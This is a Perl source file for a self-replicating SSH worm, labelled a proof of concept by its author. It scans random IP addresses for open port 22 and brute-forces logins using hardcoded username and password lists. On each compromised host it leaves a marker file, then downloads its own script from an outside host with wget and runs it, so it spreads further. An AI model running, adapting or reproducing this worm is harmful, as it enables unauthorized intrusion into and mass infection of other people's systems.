# Example of an ssh worm using brute force to gain access to systems and replicate, by [WarGame#EOF]

use IO::Socket::INET;

srand(time); # initialize random numbers generator

# users list
@users = ("root","admin","administrator","billy","bob","john","smith","linus","ryan","brian");

# pass list
@passwds = ("qwerty","system","12345","access","home","server","pass","hacker","web","command","pwd","linux","mysql","sam","start","www");

# write some signs in the victim system :)
open(IamHere,"> /tmp/iHateBirthday_is_here");
print IamHere "iHateBirthday - A PoC SsH worm by [WarGame#EOF]\n";
close(IamHere);

while(1)
{
	$ip_to_try,$current_user,$current_pass,$prompt;

	$ip_to_try = sprintf("%d.%d.%d.%d",int(rand(256)),int(rand(256)),
	int(rand(256)),int(rand(256)));
		
	
	# the real ssh-bruting part
	if(IsSSHListening($ip_to_try))
	{
		foreach $current_user(@users)
		{
			foreach $current_pass(@passwds)
			{
				MakeWork($current_user,$ip_to_try,$current_pass);
			}
		}
	}
}

sub IsSSHListening($)
{
	$host = $_[0];
	$my_sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => '22',Proto => 'tcp') or return 0;
	
	undef $my_sock;
	return 1;
}

sub MakeWork($$$) # I use ssh client in a very lame way LoL :)
{
   $true_login = sprintf("TrUe%d%d%d.sh",rand(10000),rand(100),rand(900));
   $ssh_try = sprintf("SsH%d%d%d",rand(1000),rand(7899),rand(1987));
   $ssh_cmd = sprintf("ssh %s@%s -o 'NumberOfPasswordPrompts 1' 'wget http://ihateyou.altervista.org/iHateBirthday.pl < /dev/null >& /dev/null & perl iHateBirthday.pl < /dev/null >& /dev/null &'",$_[0],$_[1]);

   $expect_script = sprintf("spawn ./$true_login\n\nexpect \"*?password:*\"\nsend -- \"%s\\r\"\nsend -- \"\\r\"\nexpect eof",$_[2]);

   open(Evil_cmd,"> $true_login") or return 0;
   print Evil_cmd $ssh_cmd;
   close(Evil_cmd);

   open(Evil_Script,"> $ssh_try") or return 0;
   print Evil_Script $expect_script;
   close(Evil_Script);
   system("chmod +x $true_login < /dev/null >& /dev/null &  expect $ssh_try < /dev/null >& /dev/null &");
}
